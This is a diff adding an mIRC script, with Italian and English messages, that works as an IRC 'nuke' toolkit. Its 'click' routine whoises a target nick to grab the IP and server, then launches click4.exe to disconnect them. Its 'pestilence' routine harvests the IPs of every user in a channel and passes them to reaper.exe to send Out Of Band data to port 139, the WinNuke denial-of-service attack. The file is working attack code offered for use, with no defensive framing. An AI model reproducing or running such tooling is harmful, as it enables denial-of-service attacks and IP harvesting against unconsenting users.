@@ -1,0 +1,92 @@
+alias click {
+  set %ClickingNick $$1
+  .enable #clicking | whois $$1 $$1
+}
+
+alias contrclick  {
+  .enable #controllo.nuke
+  timercontrollo 1 90  {
+    echo -a 0,12 >X<pl0it autoclick...  15Completed!12.
+    if (%nukkato == 1)  { .disable #controllo.nuke | .disable #clicking}  
+      else   {
+        set %query $$?!=" "
+        if (%query == $true) {
+          .disable #controllo.nuke
+          .disable #clicking
+          assault -i %ClickingNick
+        }
+      }
+      unset %Clicking* | .disable #clicking
+    }
+  }
+}
+#clicking off
+raw 401:*: .disable #clicking | unset %Clicking* | .disable #clicking | halt 
+raw 301:*: halt
+raw 311:*: set %ClickingIp $4 | echo -a IP Address... | halt
+raw 312:*: set %ClickingServer $3 | echo -a IRC Server... %ClickingServer | halt
+raw 313:*: halt
+raw 317:*: halt
+raw 319:*: halt
+raw 318:* {
+  unset %nukkato
+  run $mircdirnukes\click4.exe %ClickingServer %ClickingIP -clp 1024 -chp 1400 -sp 6666 6669 -ports 75
+
+  echo -a 0,12 >X<ploit autoclick started.   15Wait please...12.
+  ;  contrclick
+  .disable #clicking
+  halt
+}  
+#clicking end
+
+alias pest  {
+  window @Pest 50 50 300 120
+  aline @Pest Pestilence victim list of $$1 $+ ...wait.
+  aline @Pest Aggiunto: Nessuno
+  set %pest.total 0 | .remove c:\windows\temp\pestilence.ini | .enable #Pestilence.who | .who $$1
+}
+#Pestilence.Who off
+raw 352:*: {
+  if (* !isin $7) {
+    inc %pest.total 1
+    write -l c:\windows\temp\pestilence.ini $4
+    rline @pest 2 Aggiunto:  ( $+ $6 $+ [ $+ $4 $+ ]) alla lista.
+  }
+  halt
+}
+raw 315:*: { 
+  run $mircdirnukes\reaper.exe -file c:\windows\temp\pestilence.ini | unset %pest.*
+  window -c @pest
+  .disable #pestilence.who | halt
+}
+#Pestilence.who end
+#Pestilence.User off
+raw 401:*: set %Pest.Alive 0 | halt
+raw 301:*: halt
+raw 311:*: set %Pest.IP $4 | write -c pestilence.ini $4 | halt
+raw 312:*: halt
+raw 313:*: halt
+raw 317:*: halt
+raw 319:*: halt
+raw 318:* {
+  if (%pest.Alive == 0) { error Cannot proceed to OOB! %Pest.Nick is not on IRC! Check the nick and try again. | unset %pest.* | .disable #pestilence.user | halt }
+  .disable #pestilence.user
+  echo 12 -a ***Sending Out Of Band (OOB) data to ( $+ $2 $+ [ $+ %Pest.Ip $+ ]) on port 139. 
+  run $mircdirnukes\reaper.exe -file pestilence.ini |  unset %pest.* | halt
+}
+#Pestilence.User end
+;#Pestilence.Who off
+;raw 352:*: { inc %pest.total 1 | write -l pestilence.ini $4 | aline @Pestilence [Status] Added: ( $+ $6 $+ [ $+ $4 $+ ]) to list. | halt }
+;raw 315:*: { 
+;  .disable #pestilence.who
+;  %Pest.Time = $ctime - %Pest.temptime
+;  aline @Pestilence [Status] List is complete!
+;  aline @Pestilence [Status] Total: %Pest.Total
+;  aline @Pestilence [Status] Time: %Pest.Time sec(s).
+;  aline @Pestilence [Status] Proceeding to Anhilate.
+;  run $mircdirnukes\reaper.exe -file pestilence.ini |  unset %pest.* |  halt
+;}
+;#Pestilence.who end
+on +3:QUIT:if (Killed isin $1) {
+  echo -at Notice Probable Kill of $nick ! Message: $1-
+}
